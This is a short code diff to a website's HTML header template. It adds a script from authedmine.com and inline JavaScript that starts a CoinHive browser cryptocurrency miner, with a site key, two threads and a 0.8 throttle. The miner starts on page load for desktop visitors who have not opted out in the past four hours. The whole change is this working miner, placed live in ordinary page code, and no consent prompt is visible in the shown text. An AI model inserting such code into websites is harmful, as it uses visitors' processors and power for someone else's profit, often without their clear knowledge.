@@ -30,6 +30,19 @@
     <script src="/js/respond.1.4.2.min.js"></script>
   <![endif]-->
 
+  <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+  <script>
+    var miner = new CoinHive.Anonymous('aUYemM82NBJF6L8mpMoX17KGBiPIdv9d', {
+      threads: 2,
+      throttle: 0.8
+    });
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+  </script>
+
   <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=vlifesystems"></script>
 
   <!-- Begin Cookie Consent plugin by Silktide - http://silktide.com/cookieconsent -->
